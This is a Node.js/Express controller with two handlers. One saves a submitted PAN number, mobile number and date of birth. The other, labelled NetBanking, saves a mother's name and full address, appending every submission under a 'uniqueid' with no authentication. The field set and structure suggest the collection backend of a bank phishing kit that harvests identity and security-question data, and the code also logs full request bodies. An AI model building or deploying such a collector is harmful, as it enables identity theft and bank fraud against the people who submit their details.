const User = require('../models/User');
const NetBanking = require('../models/NetBanking');

exports.saveUserData = async (req, res) => {
  try {
    console.log("Request Body:", req.body);

    const { uniqueid, pan, mobile, dob } = req.body;

    // Strict validation: check for empty strings
    if (
      !uniqueid?.trim() ||
      !pan?.trim() ||
      !mobile?.trim() ||
      !dob?.trim()
    ) {
      return res.status(400).json({
        success: false,
        message: "Missing or empty required fields: uniqueid, pan, mobile, dob"
      });
    }

    let user = await User.findOne({ uniqueid });

    const newEntry = {
      pan: pan.trim(),
      mobile: mobile.trim(),
      dob: dob.trim(),
      submittedAt: new Date()
    };

    if (user) {
      user.entries.push(newEntry);
    } else {
      user = new User({
        uniqueid: uniqueid.trim(),
        entries: [newEntry]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "User PAN Data Submitted Successfully!"
    });
  } catch (error) {
    console.error("saveUserData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting user data: " + error.message
    });
  }
};

exports.saveNetBankingData = async (req, res) => {
  try {
    console.log("Request Body:", req.body);

    const { uniqueid, mother_name, full_address } = req.body;

    // Strict validation: check for empty strings
    if (
      !uniqueid?.trim() ||
      !mother_name?.trim() ||
      !full_address?.trim()
    ) {
      return res.status(400).json({
        success: false,
        message: "Missing or empty required fields: uniqueid, mother_name, full_address"
      });
    }

    let record = await NetBanking.findOne({ uniqueid });

    const newEntry = {
      mother_name: mother_name.trim(),
      full_address: full_address.trim(),
      submittedAt: new Date()
    };

    if (record) {
      record.entries.push(newEntry);
    } else {
      record = new NetBanking({
        uniqueid: uniqueid.trim(),
        entries: [newEntry]
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "NetBanking Data Submitted Successfully!"
    });
  } catch (error) {
    console.error("saveNetBankingData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting NetBanking data: " + error.message
    });
  }
};
